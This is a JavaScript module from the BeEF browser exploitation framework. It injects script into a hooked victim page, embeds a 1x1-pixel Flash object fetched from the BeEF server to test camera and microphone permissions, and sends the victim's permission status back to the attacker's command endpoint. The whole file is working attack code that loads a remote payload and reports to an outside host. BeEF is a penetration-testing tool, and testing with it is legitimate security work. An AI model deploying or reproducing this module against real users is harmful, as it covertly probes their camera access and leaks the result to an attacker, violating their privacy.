//
// Copyright (c) 2006-2013 Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (BeEF) - http://beefproject.com
// See the file 'doc/COPYING' for copying permission
//


beef.execute(function() {
    
       
    //These 3 functions [naPermissions() The camera is not available or not supported
    //					 yesPermissions() The user is allowing access to the camera / mic
    //					yesPermissions() The user has not allowed access to the camera / mic
    // Flash will invoke these functions directly.
    var js_functions = '<script>function noPermissions() { beef.net.send("<%= @command_url %>", <%= @command_id %>, "result=The user has not allowed  BeEF to access the camera :("); }; function yesPermissions() { beef.net.send("<%= @command_url %>", <%= @command_id %>, "result=The user has  allowed  BeEF to access the camera :D"); }; function naPermissions() { beef.net.send("<%= @command_url %>", <%= @command_id %>, "result=Camera not supported / available :/"); }; ';
    
    //This function is called by swfobject, if if fails to add the flash file to the page
    
    js_functions += 'function swfobjectCallback(e) { if(e.success){beef.net.send("<%= @command_url %>", <%= @command_id %>, "result=Swfobject successfully added flash object to the victim page");}else{beef.net.send("<%= @command_url %>", <%= @command_id %>, "result=Swfobject was not able to add the swf file to the page. This could mean there was no flash plugin installed.");} };</script>';
    
    
    var body_flash_container = '<div id="main" style="position:absolute;top:150px;left:80px;width:1px;height:1px;opacity:0.8;"></div>';
        
    //A library that helps include the swf file
    var swfobject_script = '<script type="text/javascript" src="http://'+beef.net.host+':'+beef.net.port+'/swfobject.js"></script>'
    
    //This is the javascript that actually calls the swfobject library to include the swf file 
    var include_script = '<script>var flashvars = {}; var parameters = {}; parameters.scale = "noscale"; parameters.wmode = "opaque"; parameters.allowFullScreen = "true"; parameters.allowScriptAccess = "always"; var attributes = {}; swfobject.embedSWF("http://'+beef.net.host+':'+beef.net.port+'/cameraCheck.swf", "main", "1", "1", "9", "expressInstall.swf", flashvars, parameters, attributes, swfobjectCallback);</script>';
    

    //Add flash content
    $j('body').append(js_functions, swfobject_script, body_flash_container, include_script);
    
});





